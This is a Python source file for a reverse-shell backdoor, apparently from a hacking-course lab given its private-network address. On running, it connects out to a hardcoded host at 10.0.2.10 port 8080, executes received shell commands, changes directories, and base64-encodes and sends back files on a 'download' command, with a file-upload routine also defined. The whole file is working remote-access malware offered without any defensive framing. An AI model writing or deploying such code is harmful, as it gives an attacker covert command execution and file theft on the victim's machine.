import os
import json
import socket
import subprocess
import base64


class MySocket():
    def __init__(self, ip, port):
        self.myConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.myConnection.connect((ip, port))

    def commandExecution(self, command):
        return subprocess.check_output(command, shell=True)

    def jsonSend(self, data):
        jsonData = json.dumps(data)
        self.myConnection.send(jsonData)

    def jsonReceive(self):
        jsonData = ""
        while True:
            try:
                jsonData = jsonData + self.myConnection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

    def readFileContent(self, path):
        with open(path, "rb") as myFile:
            return base64.b64encode(myFile.read())

    def saveFileContent(self, path, content):
        with open(path, "wb")as myFile:
            myFile.write(base64.b64decode(content))
            return "Uploaded successfully..."

    def executeCdCommand(self, directory):
        os.chdir(directory)
        return "Cd to " + directory

    def startConnection(self):
        while True:
            command = self.jsonReceive()
            try:
                if command[0] == "exit":
                    self.myConnection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    commandOutput = self.executeCdCommand(command[1])
                elif command[0] == "download":
                    commandOutput = self.readFileContent(command[1])
                else:
                    commandOutput = self.commandExecution(command)

            except Exception:
                commandOutput = "Error!"
            self.jsonSend(commandOutput)
        self.myConnection.close()


mySocketObj = MySocket("10.0.2.10", 8080)
mySocketObj.startConnection()
